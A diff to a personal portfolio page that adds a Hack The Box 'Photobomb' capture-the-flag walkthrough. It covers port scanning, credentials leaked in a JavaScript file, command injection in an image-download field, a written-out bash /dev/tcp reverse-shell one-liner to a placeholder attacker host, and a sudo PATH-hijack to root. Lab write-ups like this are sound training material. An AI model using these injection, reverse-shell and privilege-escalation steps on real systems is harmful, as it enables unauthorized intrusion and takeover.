@@ -52,24 +52,77 @@
                 <!-- Reconn -->
                 <h3>Recon</h3>
                 <p>We start by performing a scan of all open TCP ports on the machine with the following command: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.182 -oG allPorts</p>
-                <img src="htbpics/photobomb1.jpg" alt="Scan Results" class="responsive">
+                <img src="htbpics/photobomb1.jpg" alt="Scanning for open ports" class="responsive">
+
+                <p>We use our extractPorts script and this will copy the open ports onto our clipboard, then we proceed to make a second nmap scan with this new info by running the following command: nmap -sCV -p22,80 10.10.11.182 -oN targeted</p>
+                <img src="htbpics/photobomb2.jpg" alt="Scanning the open ports" class="responsive">
+
+                <p>To visualize the output in a more comfortable way, we can take advantage of bat (although we use cat as an alias for it) and we'll set up the flag -l to specify that we wanna highlight the output as it was Java code (even if it's not).<br>We can see that the TCP port 22 is open, port 22 is usually set for SSH and this is not the exception, and port 80 is also open, we can recognize this is a webpage, because of the http service and because the software serving the server is ngix, we can also see the word "Ubuntu" right next to it, so we can deduce we are facing a Linux machine</p>
+                <img src="htbpics/photobomb3.jpg" alt="Scan Results" class="responsive">
+
+                <p>If we try to go to http://10.10.11.182 we'll notice that the address will change to http://photobomb.htb, but we won't be able to reach it anyway</p>
+                <img src="htbpics/photobomb4.jpg" alt="Page not found" class="responsive">
+
+                <p>And that's because of something called Virtual Hosting, we can easily fix this adding an entry with the ip and domain in our /etc/hosts file, remember to edit the file as sudo, otherwise you won't be able to write on it</p>
+                <img src="htbpics/photobomb5.jpg" alt="Editting /etc/hosts" class="responsive">
+
+                <p>Once we did that we can refresh our browser and we should see the website</p>
+                <img src="htbpics/photobomb6.jpg" alt="Photobomb index" class="responsive">
+
+                <p>The page isn't so large so we can investigate clicking here and there, and we'll find out that by clicking on "click here!" an authentication form will show up</p>
+                <img src="htbpics/photobomb7.jpg" alt="Login form" class="responsive">
+
+                <p>We can try some default credentials like admin:admin, admin:password or root:root, but none of them seem to work, so we gotta keep investigating, if we press CTRL+U and we read the source code we can see it's almost plain html code, but it also invokes the css stylesheet and a js script called photobomb.js</p>
+                <img src="htbpics/photobomb8.jpg" alt="Index source code" class="responsive">
+
+                <p>We can click on the script to see what's inside and we can see there's a credentials leakage on this code:</p>
+                <img src="htbpics/photobomb9.jpg" alt="Script with privileged info" class="responsive">
+
+                <p>It is a good practice to keep everything well organized so we'll storage these credentials, we never know how many times we can use them</p>
+                <img src="htbpics/photobomb10.jpg" alt="Saving creds" class="responsive">
+
+                <!-- Exploitation -->
+                <h3>Exploitation</h3>
+                <p>We use the credentials found to get access from the authentication form</p>
+                <img src="htbpics/photobomb11.jpg" alt="Inside the website" class="responsive">
+
+                <p>A quick look over the page let us know the function of the website, you can choose a picture, a format, a size and then you can download it, but, how does the http request work?</p>
+                <img src="htbpics/photobomb12.jpg" alt="Burpsuite intercepting the request for an image download" class="responsive">
+
+                <p>Using Burpsuite we can intercept the request and then we can send it to the repeater to manipulate it</p>
+                <img src="htbpics/photobomb13.jpg" alt="Repeater tab with the request intercepted" class="responsive">
+
+                <p>It seems like the website is using a standard image to resize it according to what we want, this can be done on the server side and therefore we can check if any of the fields on the request is suceptible to changes, and 'filetype' is, we can check this by running a command right after the value of the field, like in this example, where we are trying to execute id after jpg</p>
+                <img src="htbpics/photobomb14.jpg" alt="http 500 response" class="responsive">
+
+                <p>The http 500 internat server error response let us know that we can indeed inject code on this, so we can create a one liner for a revershell and we will also need to url-encode it so we can send it through the request on Burpsuite, the one liner for this example is /bin/bash -c 'sh -i >& /dev/tcp/AttackerIP/AttackerPort 0>&1'</p>
+                <img src="htbpics/photobomb15.jpg" alt="URL-encoding revershell one liner" class="responsive">
+
+                <p>Notice how we changed the ip and port to the ones we are gonna use to receive the revershell. Using netcat we can set up a listener in the same port as in our one liner, once it is ready, we can send the request on Burpsuite and we will receive the connection</p>
+                <img src="htbpics/photobomb16.jpg" alt="Netcat with the revershell" class="responsive">
+
+                <p>We can do a tty treatment to improve the terminal functionalities, click here to check how to do it</p>
+                
+                <!-- Privilege escalation -->
+                <h3>Privilege escalation</h3>
+                <p>We can start off checking if we can run something as sudo by running sudo -l</p>
+                <img src="htbpics/photobomb17.jpg" alt="sudo -l output" class="responsive">
+
+                <p>And we can see there is indeed one script named /opt/cleanup.sh that can be run as sudo with no password</p>
+                <img src="htbpics/photobomb18.jpg" alt="elevation" class="responsive">
+
+                <p>On the previous image we can see the content of the script that we can run as sudo, the very last line of that script starts with 'find' (instead of /usr/bin/find), that's why we create a file named 'find' with 'sh' in its content, because if we get to manipulate the PATH we can make the system 'think' it should run our find instead of the one in /usr/bin/find<br>We can also check the user flag at this point</p>
+                <img src="htbpics/photobomb19.jpg" alt="Script with privileged info" class="responsive">
+                <p>Although we usually cannot change the PATH variable without being a superuser, we can take advantage of the sudo privileges for /opt/cleanup.sh and run the script but considering a new path by running this: sudo PATH=$PWD:$PATH /opt/cleanup.sh<br>That will run the script and when it reaches the last line, instead of executing the original 'find' binary, it will run the one we wrote, because of the PATH hierarchy.<br><br>Running our 'find' file will actually run 'sh' as sudo, that means we now have a sh as root and we can find the root flag in /root as shown on the last pic.</p>
 
 
-                <!-- Explotación -->
-                <h3>Explotación</h3>
-                <p>Explica cómo lograste acceder a la máquina. Incluye detalles de vulnerabilidades y exploits usados.</p>
+                <!-- Conclusion -->
+                <h3>Conclusion</h3>
+                <p></p>
 
-                <!-- Escalada de Privilegios -->
-                <h3>Escalada de Privilegios</h3>
-                <p>Describe los métodos que usaste para elevar tus privilegios en la máquina.</p>
-
-                <!-- Conclusión -->
-                <h3>Conclusión</h3>
-                <p>Tus pensamientos finales, lo que aprendiste de esta máquina, y cualquier otra observación relevante.</p>
-
-                <!-- Botón de Regreso -->
+                <!-- Back button -->
                 <div class="back-button" style="padding-top: 20px;">
-                    <a href="../index.html" class="button">Volver al Portafolio</a>
+                    <a href="../index.html" class="button">Back</a>
                 </div>
             </section>
         </div>
